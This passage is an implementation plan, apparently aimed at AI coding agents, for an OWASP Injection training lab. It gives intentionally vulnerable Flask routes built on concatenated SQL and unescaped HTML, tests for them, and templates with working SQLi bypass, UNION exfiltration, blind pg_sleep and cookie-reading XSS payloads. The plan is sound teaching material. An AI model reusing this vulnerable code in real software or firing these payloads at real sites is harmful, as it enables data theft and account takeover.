# A03 Injection Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add the third OWASP category — A03 Injection — to the training lab: an Overview page plus **six** graduated, genuinely exploitable examples (not three — Injection spans SQL injection, cross-site scripting, and OS command injection, each meaningfully distinct, so this category warrants more than the usual three): classic SQLi auth bypass (Easy); UNION-based SQLi exfiltration and reflected XSS (Medium ×2); blind time-based SQLi, OS command injection, and stored XSS (Hard ×3).

**Architecture:** A new Flask Blueprint (`app/categories/a03_injection`) following the exact reference pattern A01/A02 established. All six examples are public (no login required — like A02, this category is about untrusted-input handling, not access control) and share one small internal scenario: a category-owned `InjectionAccount` table (queried via raw, string-concatenated SQL, per the spec's explicit requirement that injection examples must not use parameterized queries), a `Secret` table for UNION-based exfiltration to target, and a `Comment` table for stored XSS. Every vulnerable query/command in this plan is built via direct string concatenation/formatting — never SQLAlchemy bound parameters — because that concatenation IS the vulnerability being taught.

**Tech Stack:** Same as the existing app (Flask 3, Flask-SQLAlchemy, pytest). No new dependencies — SQL injection uses `sqlalchemy.text()` with raw strings (already available), command injection uses stdlib `subprocess`, no new system packages needed (the host-lookup example uses `getent hosts`, a core glibc utility already present in the `python:3.12-slim` base image and on macOS/Linux dev machines — unlike `ping`, it needs no special capabilities and no Dockerfile change).

**Spec:** `docs/superpowers/specs/2026-09-18-owasp-lab-design.md`

**Prior work this builds on:** `docs/superpowers/plans/2026-09-18-owasp-lab-scaffold-core-a01.md` and `docs/superpowers/plans/2026-09-18-owasp-lab-a02-crypto-failures.md` (both merged to `main`) — read `app/categories/a02_crypto_failures/` for the most recent reference pattern this plan mirrors. A prep fix (commit `06977d2`, already on this branch before Task 1) sorts the nav's `CATEGORIES` by `short_id` in `app/core/__init__.py`'s context processor, closing a follow-up identified during A02's final review — no further nav-ordering work needed in this plan.

## Global Constraints

- App must bind only to `127.0.0.1` on the host (already true — no docker-compose/Dockerfile changes in this plan).
- Only synthetic/dummy data.
- The app container runs as a non-root user (already true — the `getent`-based host-lookup example needs no special capabilities, unlike `ping`, so this constraint needs no Dockerfile changes to honor).
- Settings toggles (`show_explanations`, `show_exploit_instructions`) apply to every example page, independently gated, and hiding them must never disable the underlying vulnerability. **Every example task in this plan includes its own "still works with both toggles off" regression test from the start** — this was a gap identified in A02's final review; don't repeat it here.
- Injection examples must use raw, string-concatenated SQL queries — never SQLAlchemy bound parameters (`:param` placeholders) — since the concatenation itself is the vulnerability. Build queries as plain f-strings passed to `sqlalchemy.text()`.
- No shared fictional brand across categories — A03's three data models (`InjectionAccount`, `Secret`, `Comment`) are self-contained to this category, not reused from A01/A02.
- `app/core` must never contain vulnerable logic — all of this plan's vulnerable code lives in `app/categories/a03_injection`.
- The Postgres-specific blind-SQLi timing payload (`pg_sleep`) cannot be tested against the pytest suite's SQLite backend — `pg_sleep` doesn't exist there. Task 6's automated tests prove the underlying injection is real via a portable boolean-based payload (`' OR '1'='1`); the actual timing side-channel is verified live against real Postgres in Task 9's Docker check. Don't try to make the pg_sleep payload pass in pytest — it can't, by design.

---

### Task 1: A03 blueprint scaffold + Overview page

**Files:**
- Create: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/overview.html`
- Modify: `app/__init__.py`
- Create: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: `CATEGORIES`, `CategoryNav`, `ExampleNav` (`app/core/nav.py`); `core/overview_base.html`.
- Produces: `a03_bp` Blueprint mounted at `/a03` with route `a03_injection.overview` (GET `/a03/`); appends A03's `CategoryNav` (6 examples, endpoints referencing routes added in Tasks 3–8) to `CATEGORIES` on import. None of the six endpoints take URL parameters (all use query strings or POST form data instead), so the `registered_endpoints` self-resolving nav guard needs no special zero-arg routing workaround.

- [ ] **Step 1: Write the failing test**

`tests/test_a03_overview.py`:
```python
def test_a03_overview_renders(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Injection" in response.data
    assert b"mermaid" in response.data
    assert b"language-python" in response.data


def test_a03_registered_in_nav(app):
    from app.core.nav import CATEGORIES

    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    assert a03.short_id == "A03"
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Hard",
    ]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_overview.py -v`
Expected: FAIL with 404 on `/a03/`.

- [ ] **Step 3: Write `app/categories/a03_injection/__init__.py`**

```python
from flask import Blueprint

a03_bp = Blueprint(
    "a03_injection", __name__, template_folder="templates", url_prefix="/a03"
)

from app.categories.a03_injection import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a03_injection",
        short_id="A03",
        title="Injection",
        blueprint_name="a03_injection",
        overview_endpoint="a03_injection.overview",
        examples=[
            ExampleNav(
                id="sqli-login",
                title="Authentication Bypass via SQL Injection",
                difficulty="Easy",
                endpoint="a03_injection.login",
            ),
            ExampleNav(
                id="union-exfiltration",
                title="UNION-Based SQL Injection Data Exfiltration",
                difficulty="Medium",
                endpoint="a03_injection.search",
            ),
            ExampleNav(
                id="reflected-xss",
                title="Reflected XSS in Greeting Page",
                difficulty="Medium",
                endpoint="a03_injection.greet",
            ),
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
            ),
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
            ),
            ExampleNav(
                id="stored-xss",
                title="Stored XSS in Comments",
                difficulty="Hard",
                endpoint="a03_injection.comments",
            ),
        ],
    )
)
```

- [ ] **Step 4: Write `app/categories/a03_injection/routes.py`**

```python
from flask import render_template

from app.categories.a03_injection import a03_bp


@a03_bp.route("/")
def overview():
    return render_template("a03_injection/overview.html")
```

(routes for `login`, `search`, `greet`, `check_username`, `host_lookup`, `comments` are added in Tasks 3–8)

- [ ] **Step 5: Write `app/categories/a03_injection/templates/a03_injection/overview.html`**

```html
{% extends "core/overview_base.html" %}
{% set category_short_id = "A03" %}
{% set category_title = "Injection" %}
{% block title %}A03: Injection{% endblock %}

{% block what_it_is %}
<p>
  Injection happens whenever untrusted input is concatenated directly into a command
  interpreter — a SQL query, a shell command, or even a web page's own HTML — instead of
  being kept strictly separate from that interpreter's syntax. The interpreter can't tell
  the difference between "data" and "instructions," so attacker-supplied syntax gets
  executed as if the application itself had written it.
</p>
{% endblock %}

{% block why_it_matters %}
<p>
  Injection has been a top-three OWASP category for over a decade because a single
  unescaped concatenation can hand an attacker the entire database, the underlying
  operating system, or every other visitor's browser session — often with no
  authentication required at all.
</p>
{% endblock %}

{% block how_exploited %}
<p>
  Attackers probe every input field, URL parameter, and form for characters that have
  special meaning to the interpreter behind it — quotes and comment markers for SQL,
  shell metacharacters for OS commands, angle brackets for HTML/JavaScript — then use
  that syntax to change what the interpreter does: read data it shouldn't, run commands
  it shouldn't, or execute script in a browser it shouldn't.
</p>
{% endblock %}

{% block attack_flow_diagram %}
sequenceDiagram
    participant Attacker
    participant App as Vulnerable App
    participant Interpreter as SQL / Shell / Browser
    Attacker->>App: Input containing interpreter syntax (', ;, <script>)
    App->>Interpreter: Concatenates input directly into the command
    Note over Interpreter: No boundary between data and instructions
    Interpreter-->>App: Executes attacker's injected logic
    App-->>Attacker: Unauthorized data, command output, or script execution
{% endblock %}

{% block real_world_impact %}
<p>
  Real incidents in this category include full database dumps via a single vulnerable
  search box, remote code execution on production servers via unsanitized shell calls,
  and mass account takeover via stored XSS that silently harvested every visitor's
  session cookie.
</p>
{% endblock %}

{% block vulnerable_code %}query = f"SELECT * FROM users WHERE username = '{username}'"
db.session.execute(text(query))
{% endblock %}

{% block secure_code %}query = text("SELECT * FROM users WHERE username = :username")
db.session.execute(query, {"username": username})
{% endblock %}
```

- [ ] **Step 6: Modify `app/__init__.py`** — register the A03 blueprint after the A02 registration

```python
    from app.categories.a02_crypto_failures import a02_bp

    app.register_blueprint(a02_bp)

    from app.categories.a03_injection import a03_bp

    app.register_blueprint(a03_bp)

    @app.route("/healthz")
```

- [ ] **Step 7: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass (including the two new A03 tests), 0 warnings, and the full previous suite (A01 + A02 + framework) stays green.

- [ ] **Step 8: Commit**

```bash
git add app/categories/a03_injection app/__init__.py tests/test_a03_overview.py
git commit -m "feat: add A03 blueprint scaffold and overview page"
```

---

### Task 2: Data models (InjectionAccount, Secret, Comment) + seed wiring

**Files:**
- Create: `app/categories/a03_injection/models.py`
- Create: `app/categories/a03_injection/seed.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `tests/test_a03_data.py`

**Interfaces:**
- Consumes: `db` (`app.extensions`); `seed_database`, `reset_database` (`app.core.seed`).
- Produces: `InjectionAccount` (`id`, `username` unique, `password` — plaintext, intentionally, since this category teaches injection mechanics not password storage — `is_admin`), `Secret` (`id`, `label`, `value`), `Comment` (`id`, `author`, `body`) models in `app.categories.a03_injection.models`; `seed_injection_data() -> None` in `app.categories.a03_injection.seed`, wired as `CategoryNav.seed_fn`. Consumed by Tasks 3–8's routes.

- [ ] **Step 1: Write the failing test**

`tests/test_a03_data.py`:
```python
from app.categories.a03_injection.models import Comment, InjectionAccount, Secret
from app.core.seed import reset_database, seed_database
from app.extensions import db


def test_seed_injection_data_creates_accounts_secrets_and_a_comment(app):
    seed_database(app)
    with app.app_context():
        usernames = {a.username for a in InjectionAccount.query.all()}
        assert usernames == {"alice", "admin"}
        admin = InjectionAccount.query.filter_by(username="admin").first()
        assert admin.is_admin is True
        assert Secret.query.count() == 2
        assert Comment.query.count() == 1


def test_seed_injection_data_is_idempotent(app):
    seed_database(app)
    seed_database(app)
    with app.app_context():
        assert InjectionAccount.query.count() == 2
        assert Secret.query.count() == 2
        assert Comment.query.count() == 1


def test_reset_database_restores_injection_accounts(app):
    seed_database(app)
    with app.app_context():
        admin = InjectionAccount.query.filter_by(username="admin").first()
        admin.password = "tampered"
        db.session.commit()

    reset_database(app)

    with app.app_context():
        admin = InjectionAccount.query.filter_by(username="admin").first()
        assert admin.password == "sup3r-s3cret-admin-pw"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_data.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app.categories.a03_injection.models'`.

- [ ] **Step 3: Write `app/categories/a03_injection/models.py`**

```python
from app.extensions import db


class InjectionAccount(db.Model):
    __tablename__ = "injection_accounts"

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)  # plaintext on purpose -- see A03 Easy
    is_admin = db.Column(db.Boolean, nullable=False, default=False)


class Secret(db.Model):
    __tablename__ = "a03_secrets"

    id = db.Column(db.Integer, primary_key=True)
    label = db.Column(db.String(120), nullable=False)
    value = db.Column(db.String(255), nullable=False)


class Comment(db.Model):
    __tablename__ = "a03_comments"

    id = db.Column(db.Integer, primary_key=True)
    author = db.Column(db.String(80), nullable=False)
    body = db.Column(db.Text, nullable=False)
```

- [ ] **Step 4: Write `app/categories/a03_injection/seed.py`**

```python
from app.categories.a03_injection.models import Comment, InjectionAccount, Secret
from app.extensions import db


def seed_injection_data():
    if InjectionAccount.query.count() == 0:
        db.session.add(InjectionAccount(username="alice", password="alice123", is_admin=False))
        db.session.add(
            InjectionAccount(username="admin", password="sup3r-s3cret-admin-pw", is_admin=True)
        )
        db.session.commit()
    if Secret.query.count() == 0:
        db.session.add(Secret(label="Internal API Key", value="sk_live_51NxFakeKeyForTraining000"))
        db.session.add(
            Secret(label="Database Backup Location", value="s3://internal-backups/prod-db-2024.sql.gz")
        )
        db.session.commit()
    if Comment.query.count() == 0:
        db.session.add(Comment(author="Guest", body="Nice site, looking forward to more posts!"))
        db.session.commit()
```

- [ ] **Step 5: Modify `app/categories/a03_injection/__init__.py`** — wire the seed function into the `CategoryNav` entry

Add this import alongside the existing nav import:
```python
from app.categories.a03_injection.seed import seed_injection_data  # noqa: E402
```
Then add `seed_fn=seed_injection_data,` as the last argument to the `CategoryNav(...)` call (after the `examples=[...]` block), leaving the `examples=[...]` list itself untouched from Task 1.

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass, 0 warnings.

- [ ] **Step 7: Commit**

```bash
git add app/categories/a03_injection/models.py app/categories/a03_injection/seed.py \
  app/categories/a03_injection/__init__.py tests/test_a03_data.py
git commit -m "feat: add A03 data models and seed wiring"
```

---

### Task 3: A03 Easy — Authentication Bypass via SQL Injection

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/login.html`
- Create: `tests/test_a03_login.py`

**Interfaces:**
- Consumes: `InjectionAccount` (Task 2).
- Produces: route `a03_injection.login` (GET/POST `/a03/login`, no login required — this route itself IS the vulnerable login form).

- [ ] **Step 1: Write the failing test**

`tests/test_a03_login.py`:
```python
from app.core.seed import seed_database


def test_login_with_correct_credentials_succeeds(app, client):
    seed_database(app)
    response = client.post(
        "/a03/login", data={"username": "alice", "password": "alice123"}, follow_redirects=True
    )
    assert response.status_code == 200
    assert b"Logged in as <strong>alice</strong>" in response.data


def test_login_rejects_wrong_password(app, client):
    seed_database(app)
    response = client.post(
        "/a03/login", data={"username": "alice", "password": "wrong"}, follow_redirects=True
    )
    assert response.status_code == 200
    assert b"Invalid username or password" in response.data


def test_login_sqli_bypasses_authentication(app, client):
    seed_database(app)
    response = client.post(
        "/a03/login",
        data={"username": "' OR '1'='1' -- ", "password": "anything"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"authentication bypassed" in response.data.lower()


def test_login_sqli_as_admin_via_comment(app, client):
    seed_database(app)
    response = client.post(
        "/a03/login",
        data={"username": "admin' -- ", "password": "anything"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"Logged in as <strong>admin</strong> (admin)" in response.data


def test_login_sqli_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/login",
        data={"username": "' OR '1'='1' -- ", "password": "anything"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"authentication bypassed" in response.data.lower()
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_login_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Authentication Bypass via SQL Injection" in response.data
    assert b'href="/a03/login"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_login.py -v`
Expected: FAIL with 404 on `/a03/login`.

- [ ] **Step 3: Modify `app/categories/a03_injection/routes.py`** — add imports and the `login` route

```python
from flask import render_template, request, session
from sqlalchemy import text

from app.categories.a03_injection import a03_bp
from app.categories.a03_injection.models import InjectionAccount
from app.extensions import db


@a03_bp.route("/")
def overview():
    return render_template("a03_injection/overview.html")


@a03_bp.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        # VULNERABLE: raw string-concatenated SQL, no parameterization -- this IS the lesson
        query = (
            f"SELECT * FROM injection_accounts "
            f"WHERE username = '{username}' AND password = '{password}'"
        )
        row = db.session.execute(text(query)).mappings().first()
        if row:
            session["a03_login_as"] = row["username"]
            session["a03_login_is_admin"] = row["is_admin"]
        else:
            error = "Invalid username or password."
    return render_template(
        "a03_injection/login.html",
        error=error,
        logged_in_as=session.get("a03_login_as"),
        is_admin=session.get("a03_login_is_admin", False),
    )
```

- [ ] **Step 4: Write `app/categories/a03_injection/templates/a03_injection/login.html`**

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Authentication Bypass via SQL Injection" %}
{% set example_difficulty = "Easy" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This login form builds its SQL query by directly concatenating the submitted username
  and password into the query string — something like
  <code>SELECT * FROM injection_accounts WHERE username = 'USERNAME' AND password = 'PASSWORD'</code>.
  Because the input is never escaped or parameterized, anything you type becomes part of
  the SQL itself — including SQL syntax.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>In the username field, enter: <code>' OR '1'='1' -- </code></li>
  <li>Leave the password field blank (or put anything — it's commented out).</li>
  <li>The injected <code>OR '1'='1'</code> makes the WHERE clause true for every row, and
      <code>--</code> comments out the rest of the query, so the password check never
      happens. You're logged in as whichever account the database returns first.</li>
  <li>To log in specifically as <code>admin</code> without knowing the password, try
      <code>admin' -- </code> as the username instead.</li>
</ol>
{% endblock %}

{% block live_example %}
{% if logged_in_as %}
<div class="alert alert-success">
  Logged in as <strong>{{ logged_in_as }}</strong>{% if is_admin %} (admin){% endif %} —
  authentication bypassed.
</div>
{% endif %}
{% if error %}
<div class="alert alert-danger">{{ error }}</div>
{% endif %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Username</label>
    <input type="text" class="form-control" name="username">
  </div>
  <div class="mb-2">
    <label class="form-label">Password</label>
    <input type="text" class="form-control" name="password">
  </div>
  <button type="submit" class="btn btn-primary">Log in</button>
</form>
{% endblock %}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/routes.py \
  app/categories/a03_injection/templates/a03_injection/login.html tests/test_a03_login.py
git commit -m "feat: add A03 Easy SQL injection auth-bypass example"
```

---

### Task 4: A03 Medium — UNION-Based SQL Injection Data Exfiltration

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/search.html`
- Create: `tests/test_a03_search.py`

**Interfaces:**
- Consumes: `InjectionAccount`, `Secret` (Task 2); `text`, `db` (already imported by Task 3).
- Produces: route `a03_injection.search` (GET `/a03/search`, no login required).

- [ ] **Step 1: Write the failing test**

`tests/test_a03_search.py`:
```python
from app.core.seed import seed_database


def test_search_returns_matching_accounts(app, client):
    seed_database(app)
    response = client.get("/a03/search", query_string={"q": "alice"})
    assert response.status_code == 200
    assert b"alice" in response.data


def test_search_union_exfiltrates_secrets_table(app, client):
    seed_database(app)
    payload = "' UNION SELECT id, value FROM a03_secrets -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data


def test_search_union_exfiltration_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    payload = "' UNION SELECT id, value FROM a03_secrets -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_search_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"UNION-Based SQL Injection Data Exfiltration" in response.data
    assert b'href="/a03/search"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_search.py -v`
Expected: FAIL with 404 on `/a03/search`.

- [ ] **Step 3: Modify `app/categories/a03_injection/routes.py`** — add the `search` route (no new imports needed — `request`, `text`, `db` are already imported from Task 3)

```python
@a03_bp.route("/search")
def search():
    q = request.args.get("q", "")
    results = []
    if q:
        # VULNERABLE: raw string-concatenated SQL, no parameterization
        query = f"SELECT id, username FROM injection_accounts WHERE username LIKE '%{q}%'"
        results = db.session.execute(text(query)).all()
    return render_template("a03_injection/search.html", q=q, results=results)
```

(add this after the `login` route; `login` and `overview` stay unchanged. Note: `results` uses plain `.all()`, not `.mappings().all()` — the returned `Row` objects support positional indexing (`row[0]`, `row[1]`), which is what the template needs, since a `UNION SELECT` deliberately returns rows whose column *names* come from the first SELECT but whose *values* differ per branch — indexing by position sidesteps any confusion there.)

- [ ] **Step 4: Write `app/categories/a03_injection/templates/a03_injection/search.html`**

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "UNION-Based SQL Injection Data Exfiltration" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This account-search box builds its query by concatenating your search term directly
  into a <code>LIKE '%...%'</code> clause. Because the query always selects exactly two
  columns (an id and a username), an attacker who can guess or discover that column count
  can append a <code>UNION SELECT</code> to pull rows from a completely different table —
  one never meant to be exposed here.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Search for something normal first, e.g. <code>alice</code>, to see the expected
      two-column output.</li>
  <li>Now search for:
      <code>' UNION SELECT id, value FROM a03_secrets -- </code></li>
  <li>The results table now shows rows from the <code>a03_secrets</code> table — internal
      data this search box was never supposed to expose.</li>
</ol>
{% endblock %}

{% block live_example %}
<form method="get">
  <div class="input-group mb-3">
    <input type="text" class="form-control" name="q" value="{{ q }}" placeholder="Search accounts by username">
    <button type="submit" class="btn btn-primary">Search</button>
  </div>
</form>
{% if results %}
<table class="table">
  <thead><tr><th>id</th><th>username</th></tr></thead>
  <tbody>
    {% for row in results %}
    <tr><td>{{ row[0] }}</td><td>{{ row[1] }}</td></tr>
    {% endfor %}
  </tbody>
</table>
{% elif q %}
<p class="text-muted">No results.</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/routes.py \
  app/categories/a03_injection/templates/a03_injection/search.html tests/test_a03_search.py
git commit -m "feat: add A03 Medium UNION-based SQLi exfiltration example"
```

---

### Task 5: A03 Medium — Reflected XSS in Greeting Page

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/greet.html`
- Create: `tests/test_a03_greet.py`

**Interfaces:**
- Produces: route `a03_injection.greet` (GET `/a03/greet`, no login required, no database interaction at all).

- [ ] **Step 1: Write the failing test**

`tests/test_a03_greet.py`:
```python
def test_greet_default_message(client):
    response = client.get("/a03/greet")
    assert response.status_code == 200
    assert b"Hello, friend!" in response.data


def test_greet_reflects_unescaped_script(client):
    response = client.get("/a03/greet", query_string={"name": "<script>alert(1)</script>"})
    assert response.status_code == 200
    assert b"<script>alert(1)</script>" in response.data


def test_greet_xss_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.get("/a03/greet", query_string={"name": "<script>alert(1)</script>"})
    assert response.status_code == 200
    assert b"<script>alert(1)</script>" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_greet_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Reflected XSS in Greeting Page" in response.data
    assert b'href="/a03/greet"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_greet.py -v`
Expected: FAIL with 404 on `/a03/greet`.

- [ ] **Step 3: Modify `app/categories/a03_injection/routes.py`** — add the `greet` route (no new imports needed)

```python
@a03_bp.route("/greet")
def greet():
    name = request.args.get("name", "friend")
    # VULNERABLE: HTML built by hand, then rendered with |safe -- no escaping at all
    greeting_html = f"<p>Hello, {name}! Welcome back.</p>"
    return render_template("a03_injection/greet.html", greeting_html=greeting_html, name=name)
```

(add this after the `search` route)

- [ ] **Step 4: Write `app/categories/a03_injection/templates/a03_injection/greet.html`**

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Reflected XSS in Greeting Page" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This page takes a <code>name</code> query parameter and builds a greeting by
  concatenating it directly into an HTML string on the server, then marks that string
  as safe in the template so Jinja's automatic escaping is deliberately bypassed.
  Whatever you put in <code>name</code> is inserted into the page verbatim — including
  HTML and JavaScript.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Visit this page with
      <code>?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
      appended to the URL.</li>
  <li>The script executes in your browser as soon as the page loads — this is a
      <em>reflected</em> XSS because the payload comes straight from the URL and is
      never stored.</li>
  <li>In a real attack, a victim would click a link crafted by the attacker (e.g. in a
      phishing email) containing this payload, executing arbitrary JavaScript in the
      victim's authenticated session.</li>
</ol>
{% endblock %}

{% block live_example %}
<form method="get" class="mb-3">
  <div class="input-group">
    <input type="text" class="form-control" name="name" value="{{ name }}">
    <button type="submit" class="btn btn-primary">Greet me</button>
  </div>
</form>
<div>{{ greeting_html|safe }}</div>
{% endblock %}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/routes.py \
  app/categories/a03_injection/templates/a03_injection/greet.html tests/test_a03_greet.py
git commit -m "feat: add A03 Medium reflected XSS example"
```

---

### Task 6: A03 Hard — Blind Time-Based SQL Injection

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/check_username.html`
- Create: `tests/test_a03_check_username.py`

**Interfaces:**
- Consumes: `InjectionAccount` (Task 2); `text`, `db`, `request` (already imported).
- Produces: route `a03_injection.check_username` (GET `/a03/check-username`, no login required).

**Note on scope:** the exploitation instructions teach the real Postgres `pg_sleep` timing payload, but the automated pytest suite runs against SQLite (which has no `pg_sleep` function) — so the tests below prove the underlying injection is real via a portable boolean-based payload instead. The actual timing side-channel is verified live against Postgres in Task 9's Docker check. This is intentional, not a gap to fix here.

- [ ] **Step 1: Write the failing test**

`tests/test_a03_check_username.py`:
```python
from app.core.seed import seed_database


def test_check_username_reports_available_for_unknown_user(app, client):
    seed_database(app)
    response = client.get(
        "/a03/check-username", query_string={"username": "definitely-not-a-real-user"}
    )
    assert response.status_code == 200
    assert b"available" in response.data.lower()


def test_check_username_reports_taken_for_known_user(app, client):
    seed_database(app)
    response = client.get("/a03/check-username", query_string={"username": "alice"})
    assert response.status_code == 200
    assert b"already taken" in response.data.lower()


def test_check_username_sqli_flips_result_via_boolean_injection(app, client):
    # Proves the raw SQL is injectable using a portable boolean payload.
    # The real exploitation instructions use PostgreSQL's pg_sleep() for a genuine
    # timing side-channel -- that's verified live against Postgres in the plan's
    # final Docker-verification task, not here (SQLite has no pg_sleep).
    seed_database(app)
    payload = "definitely-not-a-real-user' OR '1'='1"
    response = client.get("/a03/check-username", query_string={"username": payload})
    assert response.status_code == 200
    assert b"already taken" in response.data.lower()


def test_check_username_sqli_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    payload = "definitely-not-a-real-user' OR '1'='1"
    response = client.get("/a03/check-username", query_string={"username": payload})
    assert response.status_code == 200
    assert b"already taken" in response.data.lower()
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_check_username_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Blind Time-Based SQL Injection" in response.data
    assert b'href="/a03/check-username"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_check_username.py -v`
Expected: FAIL with 404 on `/a03/check-username`.

- [ ] **Step 3: Modify `app/categories/a03_injection/routes.py`** — add the `check_username` route (no new imports needed)

```python
@a03_bp.route("/check-username")
def check_username():
    username = request.args.get("username", "")
    exists = None
    if username:
        # VULNERABLE: raw string-concatenated SQL, no parameterization
        query = f"SELECT COUNT(*) FROM injection_accounts WHERE username = '{username}'"
        count = db.session.execute(text(query)).scalar()
        exists = bool(count)
    return render_template("a03_injection/check_username.html", username=username, exists=exists)
```

(add this after the `greet` route)

- [ ] **Step 4: Write `app/categories/a03_injection/templates/a03_injection/check_username.html`**

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Blind Time-Based SQL Injection" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "is this username taken?" check only ever tells you true or false — it never
  echoes back any data, so a classic UNION-based attack (like the search example) doesn't
  apply here. But the query is still built with raw string concatenation:
  <code>SELECT COUNT(*) FROM injection_accounts WHERE username = 'INPUT'</code>. When
  there's no data to read directly, an attacker can still extract information one bit at
  a time by injecting conditions that make the database pause — and measuring how long
  the response takes.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Enter a username that definitely doesn't exist, e.g. <code>nobody</code>, and note
      the response is fast and reports "available."</li>
  <li>Now enter:
      <code>nobody' OR (SELECT 1 FROM pg_sleep(5))=1-- </code></li>
  <li>The page takes about 5 seconds to respond — even though the result is the same
      "available" you already know. That delay is entirely attacker-controlled: swap
      <code>5</code> for a boolean sub-query (e.g. testing one character of another
      user's password at a time) and the response time itself becomes the leaked signal,
      one true/false bit per request.</li>
</ol>
<p class="text-muted">
  Note: <code>pg_sleep</code> is PostgreSQL-specific — this timing behavior only shows up
  when running against the real Postgres-backed app under <code>docker compose up</code>,
  not in the lab's fast automated tests (which run against SQLite for speed).
</p>
{% endblock %}

{% block live_example %}
<form method="get">
  <div class="input-group mb-3">
